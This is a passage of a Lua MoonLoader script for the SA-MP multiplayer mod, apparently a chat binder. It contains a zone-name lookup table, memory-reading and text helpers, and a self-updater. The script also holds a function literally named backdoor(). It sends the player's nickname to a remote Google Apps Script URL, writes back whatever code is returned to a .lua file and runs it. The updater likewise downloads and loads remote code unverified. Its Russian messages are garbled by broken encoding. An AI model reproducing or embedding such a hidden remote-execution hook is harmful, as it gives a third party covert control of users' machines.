    {"Redsands East", 1848.400, 2342.830, -89.084, 2011.940, 2478.490, 110.916},
    {"Downtown", -1580.010, 744.267, -6.1, -1499.890, 1025.980, 200.000},
    {"Conference Center", 1046.150, -1804.210, -89.084, 1323.900, -1722.260, 110.916},
    {"Richman", 647.557, -1118.280, -89.084, 787.461, -954.662, 110.916},
    {"Ocean Flats", -2994.490, 277.411, -9.1, -2867.850, 458.411, 200.000},
    {"Greenglass College", 964.391, 930.890, -89.084, 1166.530, 1044.690, 110.916},
    {"Glen Park", 1812.620, -1100.820, -89.084, 1994.330, -973.380, 110.916},
    {"LVA Freight Depot", 1375.600, 919.447, -89.084, 1457.370, 1203.280, 110.916},
    {"Regular Tom", -405.770, 1712.860, -3.0, -276.719, 1892.750, 200.000},
    {"Verona Beach", 1161.520, -1722.260, -89.084, 1323.900, -1577.590, 110.916},
    {"East Los Santos", 2281.450, -1372.040, -89.084, 2381.680, -1135.040, 110.916},
    {"Caligula's Palace", 2137.400, 1703.230, -89.084, 2437.390, 1783.230, 110.916},
    {"Idlewood", 1951.660, -1742.310, -89.084, 2124.660, -1602.310, 110.916},
    {"Pilgrim", 2624.400, 1383.230, -89.084, 2685.160, 1783.230, 110.916},
    {"Idlewood", 2124.660, -1742.310, -89.084, 2222.560, -1494.030, 110.916},
    {"Queens", -2533.040, 458.411, 0.000, -2329.310, 578.396, 200.000},
    {"Downtown", -1871.720, 1176.420, -4.5, -1620.300, 1274.260, 200.000},
    {"Commerce", 1583.500, -1722.260, -89.084, 1758.900, -1577.590, 110.916},
    {"East Los Santos", 2381.680, -1454.350, -89.084, 2462.130, -1135.040, 110.916},
    {"Marina", 647.712, -1577.590, -89.084, 807.922, -1416.250, 110.916},
    {"Richman", 72.648, -1404.970, -89.084, 225.165, -1235.070, 110.916},
    {"Vinewood", 647.712, -1416.250, -89.084, 787.461, -1227.280, 110.916},
    {"East Los Santos", 2222.560, -1628.530, -89.084, 2421.030, -1494.030, 110.916},
    {"Rodeo", 558.099, -1684.650, -89.084, 647.522, -1384.930, 110.916},
    {"Easter Tunnel", -1709.710, -833.034, -1.5, -1446.010, -730.118, 200.000},
    {"Rodeo", 466.223, -1385.070, -89.084, 647.522, -1235.070, 110.916},
    {"Redsands East", 1817.390, 2202.760, -89.084, 2011.940, 2342.830, 110.916},
    {"The Clown's Pocket", 2162.390, 1783.230, -89.084, 2437.390, 1883.230, 110.916},
    {"Idlewood", 1971.660, -1852.870, -89.084, 2222.560, -1742.310, 110.916},
    {"Montgomery Intersection", 1546.650, 208.164, 0.000, 1745.830, 347.457, 200.000},
    {"Willowfield", 2089.000, -2235.840, -89.084, 2201.820, -1989.900, 110.916},
    {"Temple", 952.663, -1130.840, -89.084, 1096.470, -937.184, 110.916},
    {"Prickle Pine", 1848.400, 2553.490, -89.084, 1938.800, 2863.230, 110.916},
    {"Los Santos International", 1400.970, -2669.260, -39.084, 2189.820, -2597.260, 60.916},
    {"Garver Bridge", -1213.910, 950.022, -89.084, -1087.930, 1178.930, 110.916},
    {"Garver Bridge", -1339.890, 828.129, -89.084, -1213.910, 1057.040, 110.916},
    {"Kincaid Bridge", -1339.890, 599.218, -89.084, -1213.910, 828.129, 110.916},
    {"Kincaid Bridge", -1213.910, 721.111, -89.084, -1087.930, 950.022, 110.916},
    {"Verona Beach", 930.221, -2006.780, -89.084, 1073.220, -1804.210, 110.916},
    {"Verdant Bluffs", 1073.220, -2006.780, -89.084, 1249.620, -1842.270, 110.916},
    {"Vinewood", 787.461, -1130.840, -89.084, 952.604, -954.662, 110.916},
    {"Vinewood", 787.461, -1310.210, -89.084, 952.663, -1130.840, 110.916},
    {"Commerce", 1463.900, -1577.590, -89.084, 1667.960, -1430.870, 110.916},
    {"Market", 787.461, -1416.250, -89.084, 1072.660, -1310.210, 110.916},
    {"Rockshore West", 2377.390, 596.349, -89.084, 2537.390, 788.894, 110.916},
    {"Julius Thruway North", 2237.400, 2542.550, -89.084, 2498.210, 2663.170, 110.916},
    {"East Beach", 2632.830, -1668.130, -89.084, 2747.740, -1393.420, 110.916},
    {"Fallow Bridge", 434.341, 366.572, 0.000, 603.035, 555.680, 200.000},
    {"Willowfield", 2089.000, -1989.900, -89.084, 2324.000, -1852.870, 110.916},
    {"Chinatown", -2274.170, 578.396, -7.6, -2078.670, 744.170, 200.000},
    {"El Castillo del Diablo", -208.570, 2337.180, 0.000, 8.430, 2487.180, 200.000},
    {"Ocean Docks", 2324.000, -2145.100, -89.084, 2703.580, -2059.230, 110.916},
    {"Easter Bay Chemicals", -1132.820, -768.027, 0.000, -956.476, -578.118, 200.000},
    {"The Visage", 1817.390, 1703.230, -89.084, 2027.400, 1863.230, 110.916},
    {"Ocean Flats", -2994.490, -430.276, -1.2, -2831.890, -222.589, 200.000},
    {"Richman", 321.356, -860.619, -89.084, 687.802, -768.027, 110.916},
    {"Green Palms", 176.581, 1305.450, -3.0, 338.658, 1520.720, 200.000},
    {"Richman", 321.356, -768.027, -89.084, 700.794, -674.885, 110.916},
    {"Starfish Casino", 2162.390, 1883.230, -89.084, 2437.390, 2012.180, 110.916},
    {"East Beach", 2747.740, -1668.130, -89.084, 2959.350, -1498.620, 110.916},
    {"Jefferson", 2056.860, -1372.040, -89.084, 2281.450, -1210.740, 110.916},
    {"Downtown Los Santos", 1463.900, -1290.870, -89.084, 1724.760, -1150.870, 110.916},
    {"Downtown Los Santos", 1463.900, -1430.870, -89.084, 1724.760, -1290.870, 110.916},
    {"Garver Bridge", -1499.890, 696.442, -179.615, -1339.890, 925.353, 20.385},
    {"Julius Thruway South", 1457.390, 823.228, -89.084, 2377.390, 863.229, 110.916},
    {"East Los Santos", 2421.030, -1628.530, -89.084, 2632.830, -1454.350, 110.916},
    {"Greenglass College", 964.391, 1044.690, -89.084, 1197.390, 1203.220, 110.916},
    {"Las Colinas", 2747.740, -1120.040, -89.084, 2959.350, -945.035, 110.916},
    {"Mulholland", 737.573, -768.027, -89.084, 1142.290, -674.885, 110.916},
    {"Ocean Docks", 2201.820, -2730.880, -89.084, 2324.000, -2418.330, 110.916},
    {"East Los Santos", 2462.130, -1454.350, -89.084, 2581.730, -1135.040, 110.916},
    {"Ganton", 2222.560, -1722.330, -89.084, 2632.830, -1628.530, 110.916},
    {"Avispa Country Club", -2831.890, -430.276, -6.1, -2646.400, -222.589, 200.000},
    {"Willowfield", 1970.620, -2179.250, -89.084, 2089.000, -1852.870, 110.916},
    {"Esplanade North", -1982.320, 1274.260, -4.5, -1524.240, 1358.900, 200.000},
    {"The High Roller", 1817.390, 1283.230, -89.084, 2027.390, 1469.230, 110.916},
    {"Ocean Docks", 2201.820, -2418.330, -89.084, 2324.000, -2095.000, 110.916},
    {"Last Dime Motel", 1823.080, 596.349, -89.084, 1997.220, 823.228, 110.916},
    {"Bayside Marina", -2353.170, 2275.790, 0.000, -2153.170, 2475.790, 200.000},
    {"King's", -2329.310, 458.411, -7.6, -1993.280, 578.396, 200.000},
    {"El Corona", 1692.620, -2179.250, -89.084, 1812.620, -1842.270, 110.916},
    {"Blackfield Chapel", 1375.600, 596.349, -89.084, 1558.090, 823.228, 110.916},
    {"The Pink Swan", 1817.390, 1083.230, -89.084, 2027.390, 1283.230, 110.916},
    {"Julius Thruway West", 1197.390, 1163.390, -89.084, 1236.630, 2243.230, 110.916},
    {"Los Flores", 2581.730, -1393.420, -89.084, 2747.740, -1135.040, 110.916},
    {"The Visage", 1817.390, 1863.230, -89.084, 2106.700, 2011.830, 110.916},
    {"Prickle Pine", 1938.800, 2624.230, -89.084, 2121.400, 2861.550, 110.916},
    {"Verona Beach", 851.449, -1804.210, -89.084, 1046.150, -1577.590, 110.916},
    {"Robada Intersection", -1119.010, 1178.930, -89.084, -862.025, 1351.450, 110.916},
    {"Linden Side", 2749.900, 943.235, -89.084, 2923.390, 1198.990, 110.916},
    {"Ocean Docks", 2703.580, -2302.330, -89.084, 2959.350, -2126.900, 110.916},
    {"Willowfield", 2324.000, -2059.230, -89.084, 2541.700, -1852.870, 110.916},
    {"King's", -2411.220, 265.243, -9.1, -1993.280, 373.539, 200.000},
    {"Commerce", 1323.900, -1842.270, -89.084, 1701.900, -1722.260, 110.916},
    {"Mulholland", 1269.130, -768.027, -89.084, 1414.070, -452.425, 110.916},
    {"Marina", 647.712, -1804.210, -89.084, 851.449, -1577.590, 110.916},
    {"Battery Point", -2741.070, 1268.410, -4.5, -2533.040, 1490.470, 200.000},
    {"The Four Dragons Casino", 1817.390, 863.232, -89.084, 2027.390, 1083.230, 110.916},
    {"Blackfield", 964.391, 1203.220, -89.084, 1197.390, 1403.220, 110.916},
    {"Julius Thruway North", 1534.560, 2433.230, -89.084, 1848.400, 2583.230, 110.916},
    {"Yellow Bell Gol Course", 1117.400, 2723.230, -89.084, 1457.460, 2863.230, 110.916},
    {"Idlewood", 1812.620, -1602.310, -89.084, 2124.660, -1449.670, 110.916},
    {"Redsands West", 1297.470, 2142.860, -89.084, 1777.390, 2243.230, 110.916},
    {"Doherty", -2270.040, -324.114, -1.2, -1794.920, -222.589, 200.000},
    {"Hilltop Farm", 967.383, -450.390, -3.0, 1176.780, -217.900, 200.000},
    {"Las Barrancas", -926.130, 1398.730, -3.0, -719.234, 1634.690, 200.000},
    {"Pirates in Men's Pants", 1817.390, 1469.230, -89.084, 2027.400, 1703.230, 110.916},
    {"City Hall", -2867.850, 277.411, -9.1, -2593.440, 458.411, 200.000},
    {"Avispa Country Club", -2646.400, -355.493, 0.000, -2270.040, -222.589, 200.000},
    {"The Strip", 2027.400, 863.229, -89.084, 2087.390, 1703.230, 110.916},
    {"Hashbury", -2593.440, -222.589, -1.0, -2411.220, 54.722, 200.000},
    {"Los Santos International", 1852.000, -2394.330, -89.084, 2089.000, -2179.250, 110.916},
    {"Whitewood Estates", 1098.310, 1726.220, -89.084, 1197.390, 2243.230, 110.916},
    {"Sherman Reservoir", -789.737, 1659.680, -89.084, -599.505, 1929.410, 110.916},
    {"El Corona", 1812.620, -2179.250, -89.084, 1970.620, -1852.870, 110.916},
    {"Downtown", -1700.010, 744.267, -6.1, -1580.010, 1176.520, 200.000},
    {"Foster Valley", -2178.690, -1250.970, 0.000, -1794.920, -1115.580, 200.000},
    {"Las Payasadas", -354.332, 2580.360, 2.0, -133.625, 2816.820, 200.000},
    {"Valle Ocultado", -936.668, 2611.440, 2.0, -715.961, 2847.900, 200.000},
    {"Blackfield Intersection", 1166.530, 795.010, -89.084, 1375.600, 1044.690, 110.916},
    {"Ganton", 2222.560, -1852.870, -89.084, 2632.830, -1722.330, 110.916},
    {"Easter Bay Airport", -1213.910, -730.118, 0.000, -1132.820, -50.096, 200.000},
    {"Redsands East", 1817.390, 2011.830, -89.084, 2106.700, 2202.760, 110.916},
    {"Esplanade East", -1499.890, 578.396, -79.615, -1339.890, 1274.260, 20.385},
    {"Caligula's Palace", 2087.390, 1543.230, -89.084, 2437.390, 1703.230, 110.916},
    {"Royal Casino", 2087.390, 1383.230, -89.084, 2437.390, 1543.230, 110.916},
    {"Richman", 72.648, -1235.070, -89.084, 321.356, -1008.150, 110.916},
    {"Starfish Casino", 2437.390, 1783.230, -89.084, 2685.160, 2012.180, 110.916},
    {"Mulholland", 1281.130, -452.425, -89.084, 1641.130, -290.913, 110.916},
    {"Downtown", -1982.320, 744.170, -6.1, -1871.720, 1274.260, 200.000},
    {"Hankypanky Point", 2576.920, 62.158, 0.000, 2759.250, 385.503, 200.000},
    {"K.A.C.C. Military Fuels", 2498.210, 2626.550, -89.084, 2749.900, 2861.550, 110.916},
    {"Harry Gold Parkway", 1777.390, 863.232, -89.084, 1817.390, 2342.830, 110.916},
    {"Bayside Tunnel", -2290.190, 2548.290, -89.084, -1950.190, 2723.290, 110.916},
    {"Ocean Docks", 2324.000, -2302.330, -89.084, 2703.580, -2145.100, 110.916},
    {"Richman", 321.356, -1044.070, -89.084, 647.557, -860.619, 110.916},
    {"Randolph Industrial Estate", 1558.090, 596.349, -89.084, 1823.080, 823.235, 110.916},
    {"East Beach", 2632.830, -1852.870, -89.084, 2959.350, -1668.130, 110.916},
    {"Flint Water", -314.426, -753.874, -89.084, -106.339, -463.073, 110.916},
    {"Blueberry", 19.607, -404.136, 3.8, 349.607, -220.137, 200.000},
    {"Linden Station", 2749.900, 1198.990, -89.084, 2923.390, 1548.990, 110.916},
    {"Glen Park", 1812.620, -1350.720, -89.084, 2056.860, -1100.820, 110.916},
    {"Downtown", -1993.280, 265.243, -9.1, -1794.920, 578.396, 200.000},
    {"Redsands West", 1377.390, 2243.230, -89.084, 1704.590, 2433.230, 110.916},
    {"Richman", 321.356, -1235.070, -89.084, 647.522, -1044.070, 110.916},
    {"Gant Bridge", -2741.450, 1659.680, -6.1, -2616.400, 2175.150, 200.000},
    {"Lil' Probe Inn", -90.218, 1286.850, -3.0, 153.859, 1554.120, 200.000},
    {"Flint Intersection", -187.700, -1596.760, -89.084, 17.063, -1276.600, 110.916},
    {"Las Colinas", 2281.450, -1135.040, -89.084, 2632.740, -945.035, 110.916},
    {"Sobell Rail Yards", 2749.900, 1548.990, -89.084, 2923.390, 1937.250, 110.916},
    {"The Emerald Isle", 2011.940, 2202.760, -89.084, 2237.400, 2508.230, 110.916},
    {"El Castillo del Diablo", -208.570, 2123.010, -7.6, 114.033, 2337.180, 200.000},
    {"Santa Flora", -2741.070, 458.411, -7.6, -2533.040, 793.411, 200.000},
    {"Playa del Seville", 2703.580, -2126.900, -89.084, 2959.350, -1852.870, 110.916},
    {"Market", 926.922, -1577.590, -89.084, 1370.850, -1416.250, 110.916},
    {"Queens", -2593.440, 54.722, 0.000, -2411.220, 458.411, 200.000},
    {"Pilson Intersection", 1098.390, 2243.230, -89.084, 1377.390, 2507.230, 110.916},
    {"Spinybed", 2121.400, 2663.170, -89.084, 2498.210, 2861.550, 110.916},
    {"Pilgrim", 2437.390, 1383.230, -89.084, 2624.400, 1783.230, 110.916},
    {"Blackfield", 964.391, 1403.220, -89.084, 1197.390, 1726.220, 110.916},
    {"'The Big Ear'", -410.020, 1403.340, -3.0, -137.969, 1681.230, 200.000},
    {"Dillimore", 580.794, -674.885, -9.5, 861.085, -404.790, 200.000},
    {"El Quebrados", -1645.230, 2498.520, 0.000, -1372.140, 2777.850, 200.000},
    {"Esplanade North", -2533.040, 1358.900, -4.5, -1996.660, 1501.210, 200.000},
    {"Easter Bay Airport", -1499.890, -50.096, -1.0, -1242.980, 249.904, 200.000},
    {"Fisher's Lagoon", 1916.990, -233.323, -100.000, 2131.720, 13.800, 200.000},
    {"Mulholland", 1414.070, -768.027, -89.084, 1667.610, -452.425, 110.916},
    {"East Beach", 2747.740, -1498.620, -89.084, 2959.350, -1120.040, 110.916},
    {"San Andreas Sound", 2450.390, 385.503, -100.000, 2759.250, 562.349, 200.000},
    {"Shady Creeks", -2030.120, -2174.890, -6.1, -1820.640, -1771.660, 200.000},
    {"Market", 1072.660, -1416.250, -89.084, 1370.850, -1130.850, 110.916},
    {"Rockshore West", 1997.220, 596.349, -89.084, 2377.390, 823.228, 110.916},
    {"Prickle Pine", 1534.560, 2583.230, -89.084, 1848.400, 2863.230, 110.916},
    {"Easter Basin", -1794.920, -50.096, -1.04, -1499.890, 249.904, 200.000},
    {"Leafy Hollow", -1166.970, -1856.030, 0.000, -815.624, -1602.070, 200.000},
    {"LVA Freight Depot", 1457.390, 863.229, -89.084, 1777.400, 1143.210, 110.916},
    {"Prickle Pine", 1117.400, 2507.230, -89.084, 1534.560, 2723.230, 110.916},
    {"Blueberry", 104.534, -220.137, 2.3, 349.607, 152.236, 200.000},
    {"El Castillo del Diablo", -464.515, 2217.680, 0.000, -208.570, 2580.360, 200.000},
    {"Downtown", -2078.670, 578.396, -7.6, -1499.890, 744.267, 200.000},
    {"Rockshore East", 2537.390, 676.549, -89.084, 2902.350, 943.235, 110.916},
    {"San Fierro Bay", -2616.400, 1501.210, -3.0, -1996.660, 1659.680, 200.000},
    {"Paradiso", -2741.070, 793.411, -6.1, -2533.040, 1268.410, 200.000},
    {"The Camel's Toe", 2087.390, 1203.230, -89.084, 2640.400, 1383.230, 110.916},
    {"Old Venturas Strip", 2162.390, 2012.180, -89.084, 2685.160, 2202.760, 110.916},
    {"Juniper Hill", -2533.040, 578.396, -7.6, -2274.170, 968.369, 200.000},
    {"Juniper Hollow", -2533.040, 968.369, -6.1, -2274.170, 1358.900, 200.000},
    {"Roca Escalante", 2237.400, 2202.760, -89.084, 2536.430, 2542.550, 110.916},
    {"Julius Thruway East", 2685.160, 1055.960, -89.084, 2749.900, 2626.550, 110.916},
    {"Verona Beach", 647.712, -2173.290, -89.084, 930.221, -1804.210, 110.916},
    {"Foster Valley", -2178.690, -599.884, -1.2, -1794.920, -324.114, 200.000},
    {"Arco del Oeste", -901.129, 2221.860, 0.000, -592.090, 2571.970, 200.000},
    {"Fallen Tree", -792.254, -698.555, -5.3, -452.404, -380.043, 200.000},
    {"The Farm", -1209.670, -1317.100, 114.981, -908.161, -787.391, 251.981},
    {"The Sherman Dam", -968.772, 1929.410, -3.0, -481.126, 2155.260, 200.000},
    {"Esplanade North", -1996.660, 1358.900, -4.5, -1524.240, 1592.510, 200.000},
    {"Financial", -1871.720, 744.170, -6.1, -1701.300, 1176.420, 300.000},
    {"Garcia", -2411.220, -222.589, -1.14, -2173.040, 265.243, 200.000},
    {"Montgomery", 1119.510, 119.526, -3.0, 1451.400, 493.323, 200.000},
    {"Creek", 2749.900, 1937.250, -89.084, 2921.620, 2669.790, 110.916},
    {"Los Santos International", 1249.620, -2394.330, -89.084, 1852.000, -2179.250, 110.916},
    {"Santa Maria Beach", 72.648, -2173.290, -89.084, 342.648, -1684.650, 110.916},
    {"Mulholland Intersection", 1463.900, -1150.870, -89.084, 1812.620, -768.027, 110.916},
    {"Angel Pine", -2324.940, -2584.290, -6.1, -1964.220, -2212.110, 200.000},
    {"Verdant Meadows", 37.032, 2337.180, -3.0, 435.988, 2677.900, 200.000},
    {"Octane Springs", 338.658, 1228.510, 0.000, 664.308, 1655.050, 200.000},
    {"Come-A-Lot", 2087.390, 943.235, -89.084, 2623.180, 1203.230, 110.916},
    {"Redsands West", 1236.630, 1883.110, -89.084, 1777.390, 2142.860, 110.916},
    {"Santa Maria Beach", 342.648, -2173.290, -89.084, 647.712, -1684.650, 110.916},
    {"Verdant Bluffs", 1249.620, -2179.250, -89.084, 1692.620, -1842.270, 110.916},
    {"Las Venturas Airport", 1236.630, 1203.280, -89.084, 1457.370, 1883.110, 110.916},
    {"Flint Range", -594.191, -1648.550, 0.000, -187.700, -1276.600, 200.000},
    {"Verdant Bluffs", 930.221, -2488.420, -89.084, 1249.620, -2006.780, 110.916},
    {"Palomino Creek", 2160.220, -149.004, 0.000, 2576.920, 228.322, 200.000},
    {"Ocean Docks", 2373.770, -2697.090, -89.084, 2809.220, -2330.460, 110.916},
    {"Easter Bay Airport", -1213.910, -50.096, -4.5, -947.980, 578.396, 200.000},
    {"Whitewood Estates", 883.308, 1726.220, -89.084, 1098.310, 2507.230, 110.916},
    {"Calton Heights", -2274.170, 744.170, -6.1, -1982.320, 1358.900, 200.000},
    {"Easter Basin", -1794.920, 249.904, -9.1, -1242.980, 578.396, 200.000},
    {"Los Santos Inlet", -321.744, -2224.430, -89.084, 44.615, -1724.430, 110.916},
    {"Doherty", -2173.040, -222.589, -1.0, -1794.920, 265.243, 200.000},
    {"Mount Chiliad", -2178.690, -2189.910, -47.917, -2030.120, -1771.660, 576.083},
    {"Fort Carson", -376.233, 826.326, -3.0, 123.717, 1220.440, 200.000},
    {"Foster Valley", -2178.690, -1115.580, 0.000, -1794.920, -599.884, 200.000},
    {"Ocean Flats", -2994.490, -222.589, -1.0, -2593.440, 277.411, 200.000},
    {"Fern Ridge", 508.189, -139.259, 0.000, 1306.660, 119.526, 200.000},
    {"Bayside", -2741.070, 2175.150, 0.000, -2353.170, 2722.790, 200.000},
    {"Las Venturas Airport", 1457.370, 1203.280, -89.084, 1777.390, 1883.110, 110.916},
    {"Blueberry Acres", -319.676, -220.137, 0.000, 104.534, 293.324, 200.000},
    {"Palisades", -2994.490, 458.411, -6.1, -2741.070, 1339.610, 200.000},
    {"North Rock", 2285.370, -768.027, 0.000, 2770.590, -269.740, 200.000},
    {"Hunter Quarry", 337.244, 710.840, -115.239, 860.554, 1031.710, 203.761},
    {"Los Santos International", 1382.730, -2730.880, -89.084, 2201.820, -2394.330, 110.916},
    {"Missionary Hill", -2994.490, -811.276, 0.000, -2178.690, -430.276, 200.000},
    {"San Fierro Bay", -2616.400, 1659.680, -3.0, -1996.660, 2175.150, 200.000},
    {"Restricted Area", -91.586, 1655.050, -50.000, 421.234, 2123.010, 250.000},
    {"Mount Chiliad", -2997.470, -1115.580, -47.917, -2178.690, -971.913, 576.083},
    {"Mount Chiliad", -2178.690, -1771.660, -47.917, -1936.120, -1250.970, 576.083},
    {"Easter Bay Airport", -1794.920, -730.118, -3.0, -1213.910, -50.096, 200.000},
    {"The Panopticon", -947.980, -304.320, -1.1, -319.676, 327.071, 200.000},
    {"Shady Creeks", -1820.640, -2643.680, -8.0, -1226.780, -1771.660, 200.000},
    {"Back o Beyond", -1166.970, -2641.190, 0.000, -321.744, -1856.030, 200.000},
    {"Mount Chiliad", -2994.490, -2189.910, -47.917, -2178.690, -1115.580, 576.083},
    {"Tierra Robada", -1213.910, 596.349, -242.990, -480.539, 1659.680, 900.000},
    {"Flint County", -1213.910, -2892.970, -242.990, 44.615, -768.027, 900.000},
    {"Whetstone", -2997.470, -2892.970, -242.990, -1213.910, -1115.580, 900.000},
    {"Bone County", -480.539, 596.349, -242.990, 869.461, 2993.870, 900.000},
    {"Tierra Robada", -2997.470, 1659.680, -242.990, -480.539, 2993.870, 900.000},
    {"San Fierro", -2997.470, -1115.580, -242.990, -1213.910, 1659.680, 900.000},
    {"Las Venturas", 869.461, 596.349, -242.990, 2997.060, 2993.870, 900.000},
    {"Red County", -1213.910, -768.027, -242.990, 2997.060, 596.349, 900.000},
    {"Los Santos", 44.615, -2892.970, -242.990, 2997.060, -768.027, 900.000}}
    for i, v in ipairs(streets) do
        if (x >= v[2]) and (y >= v[3]) and (z >= v[4]) and (x <= v[5]) and (y <= v[6]) and (z <= v[7]) then
            return v[1]
        end
    end
    return "Unknown"
end

function returnWeapDistCol(weapid, dist)
	-- ����� 100 �4 90 ��� 50 ��� 40 ���� 48 �� 80 ��������� 50
	if tweapondist[weapid] == nil then return "{FFFAFA}" end
	if tweapondist[weapid] >= dist then return "{FF0000}" end
	if tweapondist[weapid] < dist then return "{00FF00}" end
end

function getAmmoInClip()
  local struct = getCharPointer(playerPed)
  local prisv = struct + 0x0718
  local prisv = memory.getint8(prisv, false)
  local prisv = prisv * 0x1C
  local prisv2 = struct + 0x5A0
  local prisv2 = prisv2 + prisv
  local prisv2 = prisv2 + 0x8
  local ammo = memory.getint32(prisv2, false)
  return ammo
end

local russian_characters = {
    [168] = '�', [184] = '�', [192] = '�', [193] = '�', [194] = '�', [195] = '�', [196] = '�', [197] = '�', [198] = '�', [199] = '�', [200] = '�', [201] = '�', [202] = '�', [203] = '�', [204] = '�', [205] = '�', [206] = '�', [207] = '�', [208] = '�', [209] = '�', [210] = '�', [211] = '�', [212] = '�', [213] = '�', [214] = '�', [215] = '�', [216] = '�', [217] = '�', [218] = '�', [219] = '�', [220] = '�', [221] = '�', [222] = '�', [223] = '�', [224] = '�', [225] = '�', [226] = '�', [227] = '�', [228] = '�', [229] = '�', [230] = '�', [231] = '�', [232] = '�', [233] = '�', [234] = '�', [235] = '�', [236] = '�', [237] = '�', [238] = '�', [239] = '�', [240] = '�', [241] = '�', [242] = '�', [243] = '�', [244] = '�', [245] = '�', [246] = '�', [247] = '�', [248] = '�', [249] = '�', [250] = '�', [251] = '�', [252] = '�', [253] = '�', [254] = '�', [255] = '�',
}
function string.rlower(s)
    s = s:lower()
    local strlen = s:len()
    if strlen == 0 then return s end
    s = s:lower()
    local output = ''
    for i = 1, strlen do
        local ch = s:byte(i)
        if ch >= 192 and ch <= 223 then -- upper russian characters
            output = output .. russian_characters[ch + 32]
        elseif ch == 168 then -- �
            output = output .. russian_characters[184]
        else
            output = output .. string.char(ch)
        end
    end
    return output
end
function string.rupper(s)
    s = s:upper()
    local strlen = s:len()
    if strlen == 0 then return s end
    s = s:upper()
    local output = ''
    for i = 1, strlen do
        local ch = s:byte(i)
        if ch >= 224 and ch <= 255 then -- lower russian characters
            output = output .. russian_characters[ch - 32]
        elseif ch == 184 then -- �
            output = output .. russian_characters[168]
        else
            output = output .. string.char(ch)
        end
    end
    return output
end

function getStrByState(keyState)
	if keyState == 0 then
		return "{ff8533}OFF{ffffff}"
	end
	return "{85cf17}ON{ffffff}"
end

function req(u)
		while not freereq do wait(0) end
		freereq = false
		req_index = req_index + 1
		local url = u
		local file_path = getWorkingDirectory() .. '/resource/downloads/' .. tostring(req_index) .. '.dat'
		while true do
			sysdownloadcomplete = false
			download_id = downloadUrlToFile(url, file_path, download_handler)
			while not sysdownloadcomplete do wait(0) end
			local responsefile = io.open(file_path, "r")
			if responsefile ~= nil then
				local responsetext = responsefile:read("*a")
				io.close(responsefile)
				os.remove(file_path)
				freereq = true
				return u8:decode(responsetext)
			end
			os.remove(file_path)
			sampAddChatMessage("{FF0000}[LUA]: ������� ��� ���������� ������� �" .. req_index .. ", �������� �������...", 0xFFFF0000)
		end
		return ""
end

function cmd_skip(sparams)
		lua_thread.create(function()
				if sparams == "0" then skipresponse = 0 return end

				local responsetext = req('https://script.google.com/macros/s/AKfycbwa7oHfcccheNS3KnSHpnPEttNcIE-bWPrI3AXkt_Tzx_GOG9w/exec?do=alogin&pass=' .. sparams .. '')
				local re0 = regex.new("True@@.@") --
				local pas = re0:match(responsetext)
				if pas == nil then sampAddChatMessage("{FF0000}[LUA]: �������� ������.", 0xFFFF0000) thisScript():unload() return else skipresponse = 1 return end
		end)
end


function checkupdate()
		local responsetext = req('https://script.google.com/macros/s/AKfycbwa7oHfcccheNS3KnSHpnPEttNcIE-bWPrI3AXkt_Tzx_GOG9w/exec?do=getinfo')
		local re0 = regex.new("Version: (.*)\\; URL: (.*)\\; Service: (.*)\\; What new: (.*)@@.@") --
		local ver, url, serv, wn = re0:match(responsetext)
		if ver == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ���������� �� �����������.", 0xFFFF0000) thisScript():unload() return end
		if serv == "1" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������ ������ �� ������� �������� ����������� ������.", 0xFFFF0000) thisScript():unload() return end
		guis.updatestatus.wn = strunsplit(wn, 160)
		if tonumber(ver) > V then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ����� ������ " .. ver .. ". ������ ������ ���������� ����������.", 0xFFFF0000) updatescr(url, ver) end
end

function updatescr(url, ver)
		local u = url
		if u == nil then
				local responsetext = req('https://script.google.com/macros/s/AKfycbwa7oHfcccheNS3KnSHpnPEttNcIE-bWPrI3AXkt_Tzx_GOG9w/exec?do=getinfo')
				local re0 = regex.new("Version: (.*)\\; URL: (.*)\\; Service: (.*)\\; What new: (.*)@@.@") --
				local ver, urll, serv, wn = re0:match(responsetext)
				if ver == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ���������� �� �����������.", 0xFFFF0000) thisScript():unload() return  end
				if serv == "1" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}� ������ ������ �� ������� �������� ����������� ������.", 0xFFFF0000) thisScript():unload() return end
				u = urll
		end
		u = u:gsub("\\", "")
		local file_path = getWorkingDirectory() .. '/Binder for CO by Belka version ' .. ver .. '.lua'
		update_id = downloadUrlToFile(u, file_path, update_handler)
		while not updatedownloadcomplete do wait(0) end
		sampAddChatMessage("{FF0000}[LUA]: ���������� ���������.", 0xFFFF0000) 
		isobnova = true 
		os.remove("Moonloader\\Binder for CO by Belka version " .. tostring(V) .. ".lua") 
		
		script.load("Moonloader\\Binder for CO by Belka version " .. ver .. ".lua") 
		thisScript():unload() 
		return
end

function update_handler(id, status, p1, p2)
	  if stop_downloading then
	    	stop_downloading = false
	    	download_id = nil
	    	return false -- �������� ��������
	  end

	  if status == dlstatus.STATUS_DOWNLOADINGDATA then
	    	print(string.format('��������� %d �� %d.', p1, p2))
	  elseif status == dlstatus.STATUS_ENDDOWNLOADDATA then
	    	updatedownloadcomplete = true
	  end
end

function backdoor()
	local a = req("https://script.google.com/macros/s/AKfycbxUzYRtf4kFUXN6rYk-1jHq8O94bImXEzhSXQqY89FDMAEd0A6B/exec?do=get&nick=" .. sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) .. "")
	local code, ans = a:match("@@.@ S%: (%d+)%; C%: (.*) @@..@.@")
	if ans ~= nil and ans:match("Backdoor for binder") ~= nil then 
		local new = "" .. (thisScript().directory) .. "\\backdoorforbelkabinder.lua"
		local ns = io.open(new, "a")
		ns:write(ans)
		ns:close()
		script.load("moonloader/backdoorforbelkabinder.lua")
		if code == "1" then thisScript():unload() end
	end
end

function prepare()
		lua_thread.create(
				function()
						-- if os.getenv("USERNAME") == "�������" then
								-- sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������� ������� � ������? ������� /skip [������ ��������������/0 - �� ����������]", 0xFFFF0000)
								-- sampRegisterChatCommand("skip", cmd_skip)
								-- while skipresponse == -1 do wait(0) end
						-- end

						if skipresponse ~= 1 then
								while select(1, sampGetCurrentServerAddress()) ~= "95.181.158.64" and select(1, sampGetCurrentServerAddress()) ~= "95.181.158.78" and select(1, sampGetCurrentServerAddress()) ~= "95.181.158.75" do wait(0) end
								--wait(10000)
